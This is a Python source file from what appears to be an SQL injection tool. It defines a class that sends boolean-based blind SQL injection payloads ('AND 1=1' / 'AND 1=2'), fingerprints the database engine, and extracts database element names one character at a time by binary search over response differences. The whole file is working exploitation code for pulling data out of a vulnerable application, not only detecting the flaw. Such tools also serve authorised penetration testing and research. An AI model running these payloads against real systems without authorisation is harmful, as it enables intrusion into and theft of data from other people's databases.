from core.Analyzer import Analyzer
from core.Requester import Requester
from utils.constants import DIFFER_LENGTH_BOOL, InjectionContext, fingerprints


class BooleanInjector:
    """
    Detects Boolean-based SQL injection vulnerabilities.

    These vulnerabilities can allow attackers to infer database information
    by observing differences between true and false query conditions.

    For example, if the application does:

            SELECT first_name, last_name
            FROM users
            WHERE id = <input>;

    Boolean SQLi injects into the query's WHERE clause and infers information from different responses.
    """

    def __init__(self, requester: Requester, analyzer: Analyzer):
        self.requester = requester
        self.analyzer = analyzer
        self.database_engine = None

    def set_database_engine(self, database_engine: str) -> None:
        self.database_engine = database_engine

    def detect_database_engine(self, param: str, ctx: InjectionContext) -> str:
        """
        Detect the database engine by testing engine-specific version
        expressions and checking whether the resulting query produces
        the same kind of response as when the condition of the query is true.

        ***This method should only be used if the boolean injection test has succeeded.
        """
        r_true = self.requester.send({param: f"{ctx.prefix}AND 1=1{ctx.suffix}"})

        for engine, fingerprint in fingerprints.items():
            payload = f"{ctx.prefix}AND {fingerprint.version} IS NOT NULL{ctx.suffix}"
            r_version = self.requester.send({param: payload})

            # If the response with the version doesn't differ to a valid response,
            # it means that the database-specific version expression has worked.
            if not self.analyzer.responses_differ(r_true, r_version, DIFFER_LENGTH_BOOL):
                return engine

        return "Unknown"

    def test(self, param: str, ctx: InjectionContext) -> bool:
        """
        Test for boolean-based SQL injection.

        Two payloads are sent: one with a condition that is always true and
        one with a condition that is always false. If the application's
        responses differ, the parameter is likely injectable.
        """

        r_true = self.requester.send({param: f"{ctx.prefix}AND 1=1{ctx.suffix}"})
        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})

        return self.analyzer.responses_differ(r_true, r_false, DIFFER_LENGTH_BOOL)

    def get_number_returned_by_sql(
        self, param: str, ctx: InjectionContext, expression: str, high: int
    ) -> int:
        """
        Find the number returned by SQL query by using binary search
        """

        # Baseline for a query containing a false condition. If another response differs from this,
        # it would probably mean that the tested condition is true.
        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
        # Logger.debug(r_false.body)

        # Initial range
        low = 0

        while low < high:
            # Integer division to calculate the middle value between low and high
            mid = (low + high) // 2

            # To check if the name length is higher to the current mid value
            payload = f"{ctx.prefix}AND {expression}>{mid}{ctx.suffix}"
            response = self.requester.send({param: payload})
            # Logger.debug(f"Diff len: {diff_len}")

            # Add the length of the payload as baseline response doesn't contain expression
            diff_len = DIFFER_LENGTH_BOOL + len(payload)

            # If different then the condition is right
            if self.analyzer.responses_differ(r_false, response, diff_len):
                low = mid + 1
            else:
                high = mid

        return low

    def get_db_elem_name(
        self,
        database_engine: str,
        param: str,
        ctx: InjectionContext,
        expression: str,
        expr_name_len: int,
    ) -> str:
        """
        Return a database element's name after by checking the results of boolean blind tests.
        This method uses binary search to find each character efficiently.
        """

        expr_name = ""
        
        # Get the database-specific expression to handle characters
        char_expression = fingerprints[database_engine.lower()].char
        if char_expression is None:
            return ""

        # Baseline for a query containing a false condition. If another response differs from this,
        # it would probably mean that the tested condition is true.
        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})

        for digit in range(1, expr_name_len + 1):
            low = 32
            high = 126

            while low < high:
                mid = (low + high) // 2

                formatted_char_expression = char_expression.format(expression=expression, digit=digit)
                # Logger.debug(f"Formatted char expression: {formatted_char_expression}")

                payload = f"{ctx.prefix}AND {formatted_char_expression}>{mid}{ctx.suffix}"
                response = self.requester.send({param: payload})

                # If different then the condition is right

                # Add the length of the payload as baseline response doesn't contain expression
                diff_len = DIFFER_LENGTH_BOOL + len(payload)

                if self.analyzer.responses_differ(r_false, response, diff_len):
                    low = mid + 1
                else:
                    high = mid

            expr_name += chr(low)

        return expr_name

    def get_db_elem_name_chars_at_index(
        self,
        database_engine: str,
        param: str,
        ctx: InjectionContext,
        expression: str,
        range: list[int],
    ) -> list[str]:
        """
        Returns a given element's character at the given indexes by checking the
        results of boolean blind tests.
        """

        # Get the database-specific expression to handle characters
        char_expression = fingerprints[database_engine.lower()].char
        if char_expression is None:
            return []

        found_chars: list[str] = []
        # Baseline for a query containing a false condition. If another response differs from this,
        # it would probably mean that the tested condition is true.
        r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})

        for digit in range:
            # We will test against ASCII characters from number 32 (SPACE) to 126 (TILDE)
            low = 32
            high = 126
            while low < high:
                mid = (low + high) // 2

                formatted_char_expression = char_expression.format(expression=expression, digit=digit)

                payload = f"{ctx.prefix}AND {formatted_char_expression}>{mid}{ctx.suffix}"

                response = self.requester.send({param: payload})

                # Add the length of the payload as baseline response doesn't contain expression
                diff_len = DIFFER_LENGTH_BOOL + len(payload)

                # If different then the condition is right
                if self.analyzer.responses_differ(r_false, response, diff_len):
                    low = mid + 1
                else:
                    high = mid

            found_chars.append(chr(low))

        return found_chars
